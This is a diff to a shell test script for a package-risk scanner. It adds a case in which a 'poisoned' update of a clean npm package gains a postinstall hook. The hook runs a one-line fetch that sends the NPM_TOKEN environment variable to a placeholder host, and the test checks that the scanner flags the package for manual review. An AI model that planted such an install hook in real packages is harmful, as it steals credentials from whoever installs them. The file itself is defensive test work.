@@ -59,6 +59,10 @@ latest_receipt() {
   find "$STATE_DIR/package-risk/receipts" -name '*.json' -type f | sort | tail -n 1
 }
 
+receipt_path_from_output() {
+  sed -n 's/.*"receipt_path": "\([^"]*\)".*/\1/p' "$1" | head -n 1
+}
+
 write_scanner_receipt() {
   workspace=$1
   ecosystem=$2
@@ -169,6 +173,34 @@ run_capture 22 "$WORK_DIR/npm-evil.json" "$CLI" package-risk assess --workspace 
 require_contains 'npm_lifecycle_script_postinstall' "$WORK_DIR/npm-evil.json" npm_postinstall
 require_contains 'credential_or_environment_access' "$WORK_DIR/npm-evil.json" npm_secret
 require_contains 'network_capability_observed' "$WORK_DIR/npm-evil.json" npm_network
+
+MAINTAINER_BASELINE="$WORK_DIR/maintainer-baseline"
+mkdir -p "$MAINTAINER_BASELINE"
+cat >"$MAINTAINER_BASELINE/package.json" <<'JSON'
+{"name":"popular-clean-package","version":"1.0.0","whoatherePublishedAtUnixSeconds":1700000000,"private":true}
+JSON
+write_scanner_receipt "$MAINTAINER_BASELINE" npm "$WORK_DIR/maintainer-baseline-scanner.json"
+run_capture 0 "$WORK_DIR/maintainer-baseline.json" "$CLI" package-risk assess --workspace "$MAINTAINER_BASELINE" --ecosystem npm --state-dir "$STATE_DIR" --scanner-receipt "$WORK_DIR/maintainer-baseline-scanner.json" --json
+require_contains '"overall_verdict": "auto_sync_candidate"' "$WORK_DIR/maintainer-baseline.json" maintainer_baseline_auto
+MAINTAINER_BASELINE_RECEIPT=$(receipt_path_from_output "$WORK_DIR/maintainer-baseline.json")
+run_capture 0 "$WORK_DIR/maintainer-baseline-approve.json" "$CLI" package-risk approve --receipt "$MAINTAINER_BASELINE_RECEIPT" --reason "clean maintainer baseline" --state-dir "$STATE_DIR" --json
+
+MAINTAINER_POISONED="$WORK_DIR/maintainer-poisoned"
+mkdir -p "$MAINTAINER_POISONED"
+cat >"$MAINTAINER_POISONED/package.json" <<'JSON'
+{"name":"popular-clean-package","version":"1.0.1","whoatherePublishedAtUnixSeconds":1700000000,"private":true,"scripts":{"postinstall":"node postinstall.js"}}
+JSON
+cat >"$MAINTAINER_POISONED/postinstall.js" <<'JS'
+fetch("https://example.invalid/collect?token=" + process.env.NPM_TOKEN)
+JS
+write_scanner_receipt "$MAINTAINER_POISONED" npm "$WORK_DIR/maintainer-poisoned-scanner.json"
+run_capture 22 "$WORK_DIR/maintainer-poisoned.json" "$CLI" package-risk assess --workspace "$MAINTAINER_POISONED" --ecosystem npm --state-dir "$STATE_DIR" --scanner-receipt "$WORK_DIR/maintainer-poisoned-scanner.json" --json
+require_contains '"overall_verdict": "manual_review"' "$WORK_DIR/maintainer-poisoned.json" maintainer_poisoned_manual
+require_contains '"last_known_good_version": "1.0.0"' "$WORK_DIR/maintainer-poisoned.json" maintainer_poisoned_lkg
+require_contains 'known_good_diff_suspicious' "$WORK_DIR/maintainer-poisoned.json" maintainer_poisoned_diff
+require_contains 'npm_lifecycle_script_postinstall' "$WORK_DIR/maintainer-poisoned.json" maintainer_poisoned_postinstall
+require_contains 'credential_or_environment_access' "$WORK_DIR/maintainer-poisoned.json" maintainer_poisoned_secret
+require_contains 'network_capability_observed' "$WORK_DIR/maintainer-poisoned.json" maintainer_poisoned_network
 
 AI_SAFE="$WORK_DIR/ai-safe"
 mkdir -p "$AI_SAFE"
